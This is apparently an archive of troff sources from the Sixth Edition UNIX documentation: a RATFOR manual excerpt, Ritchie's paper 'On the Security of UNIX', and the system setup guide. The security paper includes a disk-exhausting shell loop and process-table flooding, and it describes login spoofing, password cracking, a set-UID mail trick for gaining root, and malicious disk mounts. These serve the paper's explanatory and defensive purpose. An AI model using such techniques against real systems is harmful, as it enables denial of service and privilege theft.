.sp 2
B. W. Kernighan
.sp
Bell Laboratories
Murray Hill, N. J. 07974
.ce 0
.fi
.sp 
.de PP
.sp
.ti +5
..
.PP
Fortran programs are hard to read, write and debug.
To make program development easier,
RATFOR 
provides a set of decent control structures:
.sp
.nf
  statement grouping
  completely general \fBif - else\fR statements
  \fBwhile\fR, \fBfor\fR and \fBdo\fR for looping
  \fBbreak\fR and \fBnext\fR for controlling loop exits
.sp
.fi
and some ``syntactic sugar'':
.sp
.nf
  free form input (e.g., multiple statements/line)
  unobtrusive comment convention
  translation of >, >=, etc., into .GT., .GE., etc.
  ``define'' statement for symbolic parameters
  ``include'' statement for including source files
.sp
.fi
.PP
RATFOR
not only
makes programming in Fortran more enjoyable,
but also allows structured programming, in the sense of
coding without
GOTO's.
RATFOR
programs tend to be markedly easier
to write, read, and make correct than their equivalents
in standard Fortran.
.PP
RATFOR
is a preprocessor,
translating the input into standard Fortran constructions.
RATFOR
programs may readily be written so the generated Fortran
is portable;
program transferability is easy to achieve.
RATFOR
is written in itself,
so it is also portable.
.sp
.PP
The grammar of
RATFOR 
is as follows:
.nf
.sp
prog	: stat 
	| prog  stat
stat	: \fBif\fP( condition ) stat 
	| \fBif\fP( condition ) stat \fBelse\fP stat
	| \fBwhile\fP( condition ) stat
	| \fBfor\fP( initialization; condition; increment ) stat
	| \fBdo\fP do-part stat
	| break
	| next
	| digits  stat
	| { prog }
	| anything unrecognizable
.fi
.sp
In the grammar above,
condition
can be any legal Fortran condition like 
"`A .EQ. B',"
i.e., anything that could appear in a legal Fortran logical 
IF
statement.
stat 
is, of course, any Fortran or
RATFOR
statement,
or any collection of these enclosed in braces.
.PP
The
while
statement performs a loop while some specified condition is true.
The test is performed at the \fIbeginning\fR of the loop,
so it is
possible to do a
while
zero times,
which can't be done with a Fortran
DO.
.PP
The
for
statement
is a somewhat generalized
while
statement
that allows an initialization and an
incrementing step as well as a termination condition
on a loop.
initialization
is any single \fIFortran\fR statement, which gets done once
before the loop begins.
increment
is any single \fIFortran\fR statement,
which gets done at the end of each pass through the loop,
before the test.
.PP
for
and
while
are useful for
backward loops, chaining along lists,
loops that must be done zero times,
and similar things which are hard to express with a 
DO
statement,
and obscure to write out directly.
.PP
The
do
statement is like a Fortran 
DO,
except that no label or 
CONTINUE
is needed.
The \fBdo-part\fP that follows the 
do
keyword has to be something that can legally go into
a Fortran 
DO
statement.
.PP
A
break
causes an immediate exit from a
for,
while
or
do
to the following statement.
The
next
statement causes an immediate transfer to the
increment
part of a
for
or
do,
and the test part of a
while.
Both
break
and
next
refer to the innermost enclosing 
for,
while
or
do.
.sp
.br
.PP
Statements can be placed anywhere on a line;
long statements are continued automatically.
Multiple statements may appear on one line,
if they are separated by semicolons.
No semi-colon is needed at the end of a line,
if
RATFOR
can guess whether the statement
ends there.
Lines ending with any characters
obviously a continuation, like plus or comma,
are assumed to be continued on the next line.
Any statement that begins with an all-numeric field is
assumed to be a Fortran label,
and placed in columns 1-5.
PP
A
`#'
character in a line marks the beginning
of a comment;
the comment is terminated by the end of a line.
.PP
Text enclosed in matching single or double quotes
is converted to
nH...
by
RATFOR,
but is otherwise unaltered.
Characters like `>', `>=', and `&'
are translated into their longer Fortran equivalents
`.GT.', 
`.GE',
and
`.AND',
except within quotes.
.PP
Any string of alphanumeric characters can be defined as a name;
thereafter, whenever that name occurs in the input
(delimited by non-alphanumerics)
it is replaced by the rest of the definition line
(comments are stripped off).
.PP
An entire source file may be included by saying
``include filename'' at the appropriate place.
-- /usr/doc/secur mode=0140775 uid=3 gid=3 atime=173059666 mtime=173059507 --
-- /usr/doc/secur/secur mode=0110664 uid=3 gid=3 atime=170727392 mtime=173059667 --
.de h
'sp 2
.tl '''UNIX Security - %'
'sp 3
..
.de f
'bp
..
.wh -6 f
.br
.wh 0 h
.de pg
.sp .5
.ti 5n
..
.de bd
.sp
.in 8n
.nf
..
.de ed
.sp
.in 0
.fi
..
.sp 2
.ce
.ft B
.ps 12
On the Security of UNIX
.sp
.ft I
.ce
Dennis M. Ritchie
.sp
.ft R
.ce
Bell Laboratories, Murray Hill, N. J.
.sp 2
.ps 10
.pg
Recently there has been much interest in the security
aspects of operating systems and software.
At issue is the ability
to prevent undesired
disclosure of information, destruction of information,
and harm to the functioning of the system.
This paper discusses the degree of security which can be provided
under the UNIX system and offers a number of hints
on how to improve security.
.pg
The first fact to face is that UNIX was not developed with
security, in any realistic sense, in mind;
this fact alone guarantees a vast number of holes.
(Actually the same statement can be made with respect
to most systems.)
The area of security in which UNIX
is theoretically weakest is
in protecting against crashing or at least crippling
the operation of the system.
The problem here is not mainly in uncritical
acceptance of bad parameters to system calls_
there may be bugs in this area, but none are known_
but rather in the lack of any checks for excessive
consumption of resources.
Most notably, there is no limit on the amount of disk
storage used, either in total space allocated or in
the number of files or directories.
Here is a particularly ghastly shell sequence guaranteed
to stop the system:
.bd
: loop
mkdir x
chdir x
goto loop
.ed
Either a panic will occur because all the i-nodes
on the device are used up or all the disk blocks will
be consumed, thus preventing anyone from writing files
on the device.
.pg
Processes are another resource on which the only limit
is total exhaustion.
For example, the sequence
.bd
command&
command&
command&
.li
. . .
.ed
if continued long enough will use up all the slots in the
system's process table and prevent
anyone from executing any commands.
Alternatively, if the commands use much core,
swap space may run out, causing a panic.
Incidently, because of the implementation of process termination,
the above sequence is effective in stopping the system
no matter how short a time it takes each command to
terminate.
(The process-table slot is not freed until the terminated
process is waited for;
if no commands without ``&'' are executed,
the Shell never executes a ``wait.'')
.pg
It should be evident that unbounded consumption of disk
space, files, swap space, and processes can easily occur
accidentally in malfunctioning programs
as well as at command level.
In fact UNIX is essentially defenseless against this kind of
abuse,
nor is there any easy fix.
The best that can be said is that it is generally
fairly
easy to detect what has happened when disaster
strikes,
to identify the user responsible,
and take appropriate action.
In practice,
we have found that difficulties
in this area are rather rare,
but we have not been faced with malicious users,
and enjoy a fairly generous supply of
resources which have served to cushion us against
accidental overconsumption.
.pg
The picture is considerably brighter
in the area of protection of information
from unauthorized perusal and destruction.
Here the degree of security seems (almost)
adequate theoretically, and the problems lie
more in the necessity for care in the actual use of
the system.
.pg
Each UNIX file has associated with it
eleven bits of protection information
together with a user identification number and a user-group
identification number
(UID and GID).
Nine of the protection bits
are used to specify independently
permission to read, to write, and to execute the file
to the user himself, to members of the user's
group, and to all other users.
Each process generated
by or for a user has associated with
it an effective UID and a real UID, and an effective and real GID.
When an attempt is made
to access the file for reading, writing, or execution,
the user process's effective UID is compared
against the file's UID; if a match is obtained,
access is granted provided the read, write, or execute
bit respectively for the user himself is
present.
If the UID for the file and for the process fail to match,
but the GID's do match, the group bits are used; if the GID's
do not match, the bits for other users are tested.
The last two bits of each file's protection information,
called the set-UID and set-GID bits,
are used only when the
file is executed as a program.
If, in this case, the set-UID bit is on for the file,
the effective UID for the process is changed to the UID
associated with the file; the change persists
until the process terminates or until the UID
changed again by another execution of a set-UID file.
Similarly the effective group ID of a process is changed
to the GID associated with a file
when that file is executed and has the set-GID bit set.
The real UID and GID of a process do not change
when any file is executed,
but only as the result of a privileged system
call.
.pg
The basic notion of the set-UID and set-GID
bits is that one may write a program which is executable
by others and which maintains files accessible to others only
by that program.
The classical example is the game-playing program which
maintains records of the scores of its players.
The program itself has to read and write the score file,
but
no one but the game's sponsor can be allowed
unrestricted access to the file lest they manipulate
the game to their own advantage.
The solution is to
turn on the set-UID bit of the
game
program.
When, and only when, it is invoked
by players of the game, it may update the score file
ordinary programs executed by others cannot
access the score.
.pg
There are a number of special cases involved
in determining access permissions.
Since executing a directory as a program is a meaningless
operation, the execute-permission
bit, for directories, is taken instead to mean
permission to search the directory for a given file
during the scanning of a path name;
thus if a directory has execute permission but no read
permission for a given user, he may access files
with known names in the directory,
but may not read (list) the entire contents of the
directory.
Write permission on a directory is interpreted to
mean that the user may create and delete
files in that directory;
it is impossible
for any user to write directly into any directory.
.pg
Another, and from the point of view of security, much
more serious special case is that there is a ``super user''
who is able to read any file and write any non-directory.
The super-user is also able to change the protection
mode and the owner UID and GID of any file
and to invoke privileged system calls.
It must be recognized that the mere notion of
a super-user is a theoretical, and usually
practical, blemish on any protection scheme.
.pg
The first necessity for a secure system
is of course arranging that all files and directories
have the proper protection modes.
Unfortunately, UNIX software is exceedingly
permissive in this regard;
essentially all commands create files
readable and writable by everyone.
This means that more or less
continuous attention must be
paid to adjusting modes properly.
If one wants to keep one's files completely secret,
it is possible to remove all permissions from the directory in which they live,
which is easy and effective;
but if it is desired
to give general read permission while
preventing writing, things are more complicated.
The main problem is that write permission in a directory
means precisely that; it has nothing to do with
write permission for a file in that directory.
Thus a writeable file in a read-only directory may be changed,
or even truncated,
though not removed.
This fact is perfectly logical, though in this case unfortunate.
A case can be made for requiring write permission for
the directory of a file as well as for the file itself
before allowing writing.
(This possibility is more complicated than it seems
at first;
the system has to allow users to change their
own directories while forbidding
them to change the user-directory directory.)
.pg
A situation converse to the above-discussed
difficulty is also present_ it is possible to
delete a file if one has write permission for its directory
independently of any permissions for the file.
This problem is related more to self-protection
than protection from others.
It is largely mitigated by the fact that
the two major commands which delete named files
(mv and rm)
ask confirmation before deleting unwritable files.
.pg
It follows from this discussion
that to maintain both data privacy and
data integrity,
it is necessary, and largely sufficient,
to make one's directory inaccessible to others.
The lack of sufficiency could follow
from the existence of set-UID programs
created by the user
and the possibility of total
breach of system security
in one of the ways discussed below
(or one of the ways not discussed below).
.pg
Needless to say, the system administrators
must be at least as careful as their most
demanding user to place the correct
protection mode on the files under their
control.
In particular,
it is necessary that special files be protected
from writing, and probably reading, by ordinary
users when
they store sensitive files belonging to other
users.
It is easy to write programs that examine and change
files by accessing the device
on which the files live.
.pg
On the issue of password security,
UNIX is probably better than most systems.
Passwords are stored in an encrypted form
which, in the absence of serious attention
from specialists in the field,
appears reasonably secure,
provided its limitations are understood.
Since both the encryption algorithm and the encrypted passwords
are available,
exhaustive enumeration of potential passwords
is feasible up to a point.
As a practical test of the possibilities in this area,
67 encrypted passwords were collected from 10 UNIX installations.
These were tested against all five-letter combinations,
all combinations of letters and digits of length four or less,
and all words in Webster's Second unabridged dictionary;
60 of the 67 passwords were found.
The whole process took about 12 hours of machine time.
This experience suggests that passwords should be
at least six characters long and randomly chosen from an alphabet
which includes digits and special characters.
.pg
Of course there also exist
feasible non-cryptanalytic
ways of finding out passwords.
For example: write a program which types out ``login:\|''
on the typewriter and copies whatever is typed
to a file of your own.
Then invoke the command and go away until the victim arrives.
(It is this kind of possibility that makes it evident that
UNIX was not designed to be secure.)
.pg
The set-UID (set-GID)
notion must be used carefully if any security is to be maintained.
The first thing to keep in mind is that
a writable set-UID file can have another program copied onto it.
For example, if the super-user
.ul
(su)
command is writable,
anyone can copy the shell
onto it and get a password-free version
of
.ul
su.
A more subtle problem
can come from
set-UID programs which are not sufficiently
careful of what is fed into them.
In some systems, for example,
the
.ul
mail
command is set-UID and owned by the super-user.
The notion is that one should be able to send
mail to anyone even if they want to protect
their directories from writing.
The trouble is that
.ul
mail
is rather dumb:
anyone can mail someone else's private file to himself.
Much more serious,
is the following scenario:
make a file with a line like one in the password file
which allows one to log in as the super-user.
Then make a link named ``.mail'' to the password file
in some writeable
directory on the same device as the password file (say /tmp).
Finally mail the bogus login line to /tmp/.mail;
You can then login as the super-user,
clean up the incriminating evidence,
and have your will.
.pg
The fact that users can mount their own disks and tapes
as file systems
can be another way of gaining super-user status.
Once a disk pack is mounted, the system believes
what is on it.
Thus one can take a blank disk pack,
put on it anything desired,
and mount it.
There are obvious and unfortunate consequences.
For example:
a mounted disk with garbage on it will crash the
system;
one of the files on the mounted disk can easily be
a password-free version of
.ul
su;
other files can be unprotected entries for special files.
The only easy fix for this problem is to
forbid the use of
.ul
mount
to unprivileged users.
A partial solution, not so restrictive,
would be to have the
.ul
mount
command examine the special file for bad data,
set-UID programs owned by others, and accessible
special files,
and balk at unprivileged invokers.
-- /usr/doc/start mode=0140775 uid=3 gid=3 atime=174846539 mtime=174846539 --
-- /usr/doc/start/cover mode=0100664 uid=3 gid=3 atime=174846491 mtime=174846533 --
.nf
.sp 2i
.ps 12
.ft B
.vs 14p
.ce 100
DOCUMENTS FOR USE WITH THE
UNIX TIME-SHARING SYSTEM
.sp
.ps 11
.ft I
Sixth Edition
.sp 2i
.ps 10
.vs 12p
.ft R
The enclosed UNIX documentation is supplied
in accordance with the Software Agreement
you have with the Western Electric Company.
.ce 0
.ce
.bp
.sp 2i
.ft B
CONTENTS
.sp
.ft R
.in 1i
.vs 20p
\01. Setting Up UNIX \- Sixth Edition
\02. The UNIX Time-Sharing System
\03. C Reference Manual
\04. Programming in C \- A Tutorial
\05. UNIX Assembler Reference Manual
\06. A Tutorial Introduction to the ED Text Editor
\07. UNIX for Beginners
\08. RATFOR \- A Preprocessor for a Rational Fortran
\09. YACC \- Yet Another Compiler-Compiler
10. NROFF Users' Manual
11. The UNIX I/O System
12. A Manual for the Tmg Compiler-writing Language
13. On the Security of UNIX
14. The M6 Macro Processor
15. A System for Typesetting Mathematics
16. DC \- An Interactive Desk Calculator
17. BC \- An Arbitrary Precision Desk-Calculator Language
18. The Portable C  Library (on UNIX)
19. UNIX Summary
-- /usr/doc/start/start mode=0110664 uid=3 gid=3 atime=174846498 mtime=174846498 --
.TL
SETTING UP UNIX \- Sixth Edition
.PP
Enclosed are:
.IP 1.
`UNIX Programmer's Manual,' Sixth Edition.
.IP 2.
Documents with the following titles:
.DS
Setting Up UNIX \- Sixth Edition
The UNIX Time-Sharing System
C Reference Manual
Programming in C \- A Tutorial
UNIX Assembler Reference Manual
A Tutorial Introduction to the ED Text Editor
UNIX for Beginners
RATFOR \- A Preprocessor for a Rational Fortran
YACC \- Yet Another Compiler-Compiler
NROFF Users' Manual
The UNIX I/O System
A Manual for the Tmg Compiler-writing Language
On the Security of UNIX
The M6 Macro Processor
A System for Typesetting Mathematics
DC \- An Interactive Desk Calculator
BC \- An Arbitrary Precision Desk-Calculator Language
The Portable C  Library (on UNIX)
UNIX Summary
.DE
.IP 3.
The UNIX software on magtape or disk pack.
.PP
If you are set up to do it,
it might be a good idea immediately to make a copy of the disk
or tape to guard against disaster.
The tape contains 12100 512-byte records
followed by a single file mark;
only the first 4000 512-byte blocks on the disk
are significant.
.PP
The system as distributed corresponds to three fairly
full RK packs.
The first contains the binary version of all programs, and the
source for the operating system itself;
the second contains all remaining source programs;
the third contains manuals intended to be
printed using the formatting programs roff or nroff.
The `binary' disk is enough to run the system,
but you will almost certainly want to modify some source
programs.
.SH
Making a Disk From Tape
.PP
If your system
is on magtape,
perform the following bootstrap procedure to obtain
a disk with the binaries.
.IP 1.
Mount magtape on drive 0 at load point.
.IP 2.
Mount formatted disk pack on drive 0.
.IP 3.
Key in and execute at 100000
.RT
.DS
  TU10			  TU16
012700			(to be added)
172526
010040
012740
060003
000777
.DE
.IP
The tape should move and the CPU loop.
(The TU10 code is
.I
not
.R
the DEC bulk ROM for tape;
it reads block 0, not block 1.)
.IP 4.
Halt and restart the CPU at 0.
The tape should rewind.
The console should type `='.
.IP 5.
Copy the magtape to disk by the following.
This assumes TU10 and RK05; see 6 below for other
devices.
The machine's printouts are shown in italic
(the `=' signs should be considered italic).
Terminate each line you type by carriage return or line-feed.
.DS
= tmrk
.I
disk offset
.R
0
.I
tape offset
.R
100		(See 6 below)
.I
count
.R
1		(The tape should move)
= tmrk
.I
disk offset
.R
1
.I
tape offset
.R
101		(See 7 below)
.I
count
.R
3999		(The tape moves lots more)
=
.DE
To explain:
the
.I
tmrk
.R
program copies tape to disk with the given offsets and counts.
Its first use copies a bootstrap program
to disk block 0;
the second use copies the file system itself onto the disk.
You may get back to `=' level by starting
at 137000.
.IP 6.
If you have TU16 tape
say `htrk' instead of `tmrk' in the above example.
If you have an RP03 disk, say `tmrp' or `htrp',
and use a 99 instead of 100 tape offset.
If you have an RP04 disk, use `tmhp' or `hthp' instead or
`tmrk', and use a 98 instead of 100 tape offset.
The different offsets load bootstrap programs
appropriate to the disk they will live on.
.IP 7.
This procedure generates the `binary' disk; the `source' disk
may be generated on another RK pack by using a tape offset of 4101 instead of
101.
The `document' disk is at offset 8101 instead of 101.
Unless you have only a single RK drive,
it is probably wise to wait on generating these disks.
Better tools are available using UNIX itself.
.SH
Booting UNIX
.PP
Once the UNIX `binary' disk is obtained, the system is booted
by keying in and executing one of the following programs at 100000.
These programs correspond to the DEC bulk ROMs
for disks, since they read in and execute block 0 at location 0.
.DS
  RK05		  RP03		  RP04
012700		012700		(to be added)
177414		176726
005040		005040
005040		005040
010040		005040
012740		010040
000005		012740
105710		000005
002376		105710
005007		002376
			005007
.DE
Now follow the indicated dialog,
where `@' and `#' are prompts:
.DS
@ rkunix		(or `rpunix' or `hpunix')
.I
mem = xxx
login:  \fRroot
.I
#
.R
.DE
The
.I
mem
.R
message gives the memory available to user programs
in .1K units.
Most of the UNIX software will run with
120 (for 12K words),
but some things require much more.
.PP
UNIX is now running,
and the `UNIX Programmer's manual' applies;
references below of the form X-Y mean the subsection named
X in section Y of the manual.
The `#' is the prompt from the UNIX Shell,
and indicates you are logged in as the super-user.
The only valid user names are
`root' and `bin'.
The root is the super-user and bin
is the owner of nearly every file in the file system.
.PP
Before UNIX is turned up completely,
a few configuration dependent exercises must be
performed.
At this point,
it would be wise to read all of the manuals
and to augment this reading with hand to hand
combat.
It might be instructive to examine
the Shell run files
mentioned below.
.SH
Reconfiguration
.PP
The UNIX system running is configured to
run on an 11/40 with the given disk,
TU10 magtape and TU56 DECtape.
This is almost certainly not the correct
configuration.
Print (cat-I)
the file /usr/sys/run.
This file is a set of Shell commands
that will completely recompile the system source,
install it in the correct libraries and build the
three configurations for rk, rp and hp.
.PP
Using the Shell file as a guide,
compile (cc-I) and rename (mv-I) the
configuration program `mkconf'.
Run the configuration program and
type into it a list of the controllers on
your system.
Choose from:
.DS
pc	(PC11)
lp	(LP11)
rf	(RS11)
hs	(RS03/RS04)
tc	(TU56)
rk	(RK03/RK05)
tm	(TU10)
rp	(RP03)
hp	(RP04)
ht	(TU16)
dc*	(DC11)
kl*	(KL11/DL11-ABC)
dl*	(DL11-E)
dp	(DP11)
dn	(DN11)
dh	(DH11)
dhdm	(DM11-BB)
.DE
The devices marked with * should be preceded by
a number specifying how many.
(The console typewriter is automatically included;
don't count it in the kl specification.)
Mkconf will generate the two files l.s
(trap vectors) and c.c (configuration table).
Take a careful look at
l.s to make sure that all the devices that you
have are assembled in the correct interrupt vectors.
If your configuration is non-standard, you will
have to modify l.s to fit your configuration.
.PP
In the run Shell file,
the 11/45 code is commented out.
If you have an 11/45 you must also edit (ed-I) the
file /usr/sys/conf/m45.s to set the assembly
flag fpp to reflect if you have the FP11-B floating point
unit.
The main difference between an 11/40 and an
11/45 (or 11/70)
system is that
in the former instruction restart after a segmentation
violation caused by overflowing a user stack
must be handled by software, while in the latter
machines there is hardware help.
As mentioned above, the 11/45 and 11/70
systems include conditionally-enabled code
to save the status of the floating point unit
when switching users.
The source for such things is in one of the
two files m40.s and m45.s.
.PP
Another difference is that in 11/45 and 11/70 systems
the instruction and data spaces are separated inside UNIX itself.
Since the layout of addresses in the system
is somewhat peculiar, and not directly supported by the
link-editor
.I
ld,
.R
the
.I
sysfix
.R
program has to be run before the loaded output file can be
booted.
.PP
There are certain magic numbers and
configuration parameters imbedded in various
device drivers that you may want to change.
The device addresses of each device
are defined in each driver.
In case you have any non-standard device
addresses,
just change the address and recompile.
(The device drivers are in the directory
/usr/sys/dmr.)
.PP
The DC11 driver is set to run 14 lines.
This can be changed in dc.c.
.PP
The DH11 driver will only handle a single DH
with a full complement of 16 lines.
If you have less,
you may want to edit dh.c.
.PP
The DN11 driver will handle 3 DN's.
Edit dn.c.
.PP
The DP11 driver can only handle a single DP.
This cannot be easily changed.
.PP
The KL/DL driver is set up to run
a single DL11-A, -B, or -C (the console)
and no DL11-E's.
To change this, edit
kl.c to have NKL11 reflect the total number of
DL11-ABC's and
NDL11 to reflect the number of DL11-E's.
So far as the driver is concerned,
the difference between the devices is
their addresses.
.PP
The line printer driver is set up
to print the 96 character set
on 80 column paper
(LP11-H)
with indenting.
Edit lp.c.
.PP
All of the disk and tape drivers
(rf.c, rk.c, rp.c, tm.c, tc.c,
hs.c, hp.c, ht.c)
are set up to run 8 drives and should not
need to be changed.
The big disk drivers (rp.c and hp.c)
have partition tables in them which you
may want to experiment with.
.PP
After all the corrections
have been made,
use /usr/sys/run as a guide to recompile the
changed drivers, install them in /usr/sys/lib2
and to assemble the trap vectors (l.s), configuration
table (c.c) and machine language assist (m40.s or m45.s).
After all this,
link edit the objects (ld-I)
and if you have an 11/45, sysfix the result.
The final object file (a.out) should be
renamed /unix and booted.
See Boot Procedures-VIII for a discussion
of booting.
(Note: remember, before booting,
always perform
a sync-VIII
to force delayed output to the disk.)
.SH
Special Files
.PP
Next you must put in all of the special files in
the directory /dev using mknod-VIII.
Print the configuration file
c.c created above.
This is the major
device switch of each device class (block and character).
There is one line for each device configured in your system
and a null line for place holding for those devices
not configured.
The block special devices are put in first
by executing the following generic command
for each disk or tape drive.
(Note that some of these files already exist
in the directory /dev.
Examine each file with ls-I with \-l flag to
see if the file should be removed.)
.DS
	/etc/mknod /dev/NAME b MAJOR MINOR
.DE
The NAME is selected from the following list:
.DS
c.c	NAME	device
rf	rf0	RS fixed head disk
tc	tap0	TU56 DECtape
rk	rk0	RK03 RK05 moving head disk
tm	mt0	TU10 TU16 magtape
rp	rp0	RP moving head disk
hs	hs0	RS03 RS04 fixed head disk
hp	hp0	RP04 moving head disk
.DE
The major device number is selected by counting the
line number (from zero)
of the device's entry in the block configuration table.
Thus the first entry in the table bdevsw would be
major device zero.
.PP
The minor device is the drive number,
unit number or partition as described
under each device in section IV.
The last digit of the name
(all given as 0 in the table above)
should reflect the minor device number.
For tapes where the unit is dial selectable,
a special file may be made for each possible
selection.
.PP
The same goes for the character devices.
Here the names are arbitrary except that
devices meant to be used
for teletype access should be named
/dev/ttyX, where X is any character.
The files tty8 (console), mem, kmem, null are
already correctly configured.
.PP
The disk and magtape drivers provide a `raw' interface
to the device which provides direct transmission
between the user's core and the device and allows
reading or writing large records.
The raw device counts as a character device,
and should have the name of the corresponding
standard block special file with `r' prepended.
Thus the raw magtape
files would be called /dev/rmtX.
.PP
When all the special files have been created,
care should be taken to change
the access modes (chmod-I)
on these files to appropriate values.
.SH
The Source Disk
.PP
You should now extract the source disk.
This can be done as described above
or the UNIX command dd-I may be used.
The disk image begins at block 4100 on the tape,
so the command
.DS
dd if=/dev/mt0 of=/dev/rk1 count=4000 skip=4100
.DE
might be used to extract the disk
to RK drive 1.
.PP
This disk should be mounted (mount-VIII) on /usr/source; it contains
directories of source code.
In each directory is a Shell file run that
will recompile all the source in the directory.
These run files should be consulted whenever
you need to recompile.
.SH
Floating Point
.PP
UNIX only supports the 11/45 FP11-B
floating point unit.
For machines without this hardware,
there is a user subroutine
available that will catch illegal instruction
traps and interpret floating point operations.
(See fptrap-III.)
The system as delivered has this code included
in all commands that have floating point.
This code is never used if the FP hardware
is available and therefore does not
need to be changed.
The penalty is a little bit of disk space and
loading time for the few floating commands.
.PP
The C compiler in /usr/source/c probably
should be changed if floating point is available.
The fpp flag in c0t.s should be set and
C should be recompiled and reloaded and
installed.
This allows floating point C programs to be
compiled without the \-f flag and prevents
the floating point interpreter from getting
into new floating programs.
(See /usr/source/c/run.)
.SH
Time Conversion
.PP
If your machine is not in the Eastern time zone,
you must edit (ed-I) the subroutine
/usr/source/s4/ctime.c to reflect your local time.
The variable `timezone' should be changed
to reflect the time difference between local time and GMT.
For EST, this is 5*60*60; for PST it would be 8*60*60.
This routine also contains the names of the
standard and Daylight Savings time zone;
so `EST' and `EDT' might be changed to `PST' and `PDT'
respectively.
Notice that these two names are in upper case
and escapes may be needed (tty-IV).
Finally, there is a `daylight'
flag;
when it is 1 it causes the
time to shift to Daylight Savings automatically
between the last Sundays in April and October
(or other algorithms in 1974 and 1975).
Normally this will not have to be reset.
After ctime.c has been edited
it should be compiled and installed in
its library.
(See /usr/source/s4/run.)
Then you should
(at your leisure)
recompile and reinstall
all programs performing time conversion.
These include:
(in s1)
date, dump, ls, cron,
(in s2)
mail, pr, restor, who, sa and tp.
.SH
Disk Layout
.PP
If
there are to be more file systems mounted than just the root,
use mkfs-VIII to create the new file system and
put its mounting in the file /etc/rc (see init-VIII and mount-VIII).
(You might look at /etc/rc anyway to
see what has been provided for you.)
.PP
There are two considerations in deciding how to adjust the arrangement
of things on your disks:
the most important is making sure there is adequate space
for what is required;
secondarily, throughput should be maximized.
The RK disk (or its image)
as distributed has 4000 blocks for file storage,
and the remainder of the disk (872 blocks)
is set aside for swap space.
In our own system, which allows 14 simultaneous users,
this amount of swap space is not quite enough,
so we use 1872 blocks for this purpose;
it is large enough so running out of swap space never
occurs.
.PP
Many common system programs (C, the editor, the assembler etc.)
create intermediate files in the /tmp directory,
so the file system where this is stored also should be made
large enough to accommodate
most high-water marks.
In an idle state, we have about 900 free blocks
on the file system where /tmp resides,
and hit the bottom every few days or so.
(This causes a momentary disruption,
but not a crash, as swap-space runout does.)
All the programs that create files in /tmp try to take
care to delete them, but most are not immune to
events like being hung up upon, and can leave dregs.
The directory should be examined every so often and the old
files deleted.
.PP
Exhaustion of user-file space is certain to occur
now and then;
the only mechanisms for controlling this phenomenon
are occasional use of du-I and threatening
messages of the day and personal letters.
.PP
The efficiency with which UNIX is able to use the CPU
is largely dictated by the configuration of disk controllers.
For general time-sharing applications,
the best strategy is to try to split user files,
the root directory (including the /tmp directory)
and the swap area among three controllers.
In our own system, for example, we have user files on an RP,
the root on an RF fixed-head disk, and swap on an RK.
This is best for us since the RK has a faster transfer
rate than the rather slow RF, and in swapping
the transfer rate rather than access time
is the dominant influence on throughput.
.PP
Once you have decided how to make best use
of your hardware, the question is how to initialize it.
If you have the equipment,
the best way to move a file system
is to dump it (dump-VIII) to magtape,
use mkfs-VIII to create the new file system,
and restore the tape.
If you don't have magtape,
dump accepts an argument telling where to put the dump;
you might use another disk or DECtape.
Sometimes a file system has to be increased in logical size
without copying.
The super-block of the device has a word
giving the highest address which can be allocated.
For relatively small increases, this word can be patched
using the debugger (db-I)
and the free list reconstructed using icheck-VIII.
The size should not be increased very greatly
by this technique, however,
since although the allocatable space will increase
the maximum number of files will not (that is, the i-list
size can't be changed).
Read and understand the description given in file system-VI
before playing around in this way.
.PP
If you have only an RP disk,
see section rp-IV for some suggestions
on how to lay out the information on it.
The file systems distributed on tape, containing the binary, the source,
and the manuals,
are each only 4000 blocks long.
Perhaps the simplest way to integrate the latter two
into a large file system is to extract the
tape into the upper part of the RP,
dump it,
and restore it into an empty, non-overlapping
file system structure.
If you have to merge a file system into another, existing one,
the best bet is to
use ncheck-VIII
to get a list of names, then edit this list
into a sequence of mkdir and cp commands
which will serve as input to the Shell.
(But notice that owner information is
lost.)
.SH
New Users
.PP
Install new users by editing the password file
/etc/passwd (passwd-V).
You'll have to make current directories for the new users
and change their owners to the
newly installed name.
Login as each user to make sure the password
file is correctly edited.
For example:
.DS
ed /etc/passwd
$a
joe::10:1::/usr/joe:
.li
.
w
q
mkdir /usr/joe
chown joe /usr/joe
login joe
ls \-la
login root
.DE
This will make a new login entry for joe.
His default current directory is
/usr/joe
which has been created.
The delivered password file
has the user
.I
ken
.R
in it to be used as a prototype.
.SH
Multiple Users
.PP
If UNIX is to support simultaneous
access from more than just the console teletype,
the file /etc/ttys (ttys-V) has to be edited.
For some historical reason tty8 is the name of the console typewriter.
To add new typewriters be sure the device is configured
and the special file exists, then set
the first character of the appropriate line of /etc/ttys to 1
(or add a new line).
Note that init.c will have to be recompiled if there are to be
more than 20 typewriters.
Also note that if the special file is inaccessible when init tries to create a process
for it, the system will thrash trying and retrying to open it.
.SH
File System Health
.PP
Periodically (say every day or so) and always after a crash,
you should check all the file systems for consistency
(icheck, dcheck-VIII).
It is quite important to execute sync (VIII)
before rebooting or taking the machine down.
This is done automatically every 30 seconds by the update
program (VIII) when a multiple-user system is running,
but you should do it anyway to make sure.
.PP
Dumping of the file system should be done regularly,
since once the system is going it is very easy to
become complacent.
Just remember that our RP controller has failed three times,
each time in such a way that all information
on the disk was wiped out without any
error status from the controller.
Complete and incremental dumps are easily done with
the dump command (VIII) but restoration of individual
files is painful.
Dumping of files by name is best done by
tp (I) but the number of files is limited.
Finally if there are enough drives entire
disks can be copied using cp-I, or preferably with
dd-I using the raw special files and an appropriate
block size.
Note that there is no stand-alone program
with UNIX that will restore any of these formats.
Unless some action has been taken to
prevent destruction of a running version of
UNIX, you can find yourself stranded even though
you have backup.
.bp
.SH
Odds and Ends
.PP
The programs
dump,
icheck, dcheck, ncheck, and df
(source in /usr/source/s1 and /usr/source/s2)
should be changed to
reflect your default mounted file system devices.
Print the first few lines of these
programs and the changes will be obvious.
.PP
If you would like to share any UNIX compatible
software with others,
please let us know about it.
If you find bugs in the software or the
documentation,
again let us know.
.PP
Lastly,
there is a UNIX users' group forming.
To get on their mailing list,
send your name(s) and address to:
.DS
Prof. Melvin Ferentz
Physics Dept.
Brooklyn College of CUNY
Brooklyn, N.Y. 11210
.DE
.PP
.DS
		Good luck.
		Ken Thompson
		Dennis Ritchie
.DE
-- /usr/doc/unix mode=0140775 uid=3 gid=3 atime=173059678 mtime=173059507 --
-- /usr/doc/unix/p0 mode=0100664 uid=3 gid=3 atime=170468708 mtime=173059678 --
.ll 6.5i
.lt 6.5i
.br
'tl '-'''
.nr r 0 1
.pl 11i
.ps 10
.// "t" is "teeny" size
.// "s" is small caps
.// "n" is normal
.ds t \s6
.ds n \s10
.ds s \s8
.ds r \s6\|\v'-.5m'\\n+r\v'.5m'\*n\|
.vs 12p
.de pg
.sp .5
.br
.ne 2
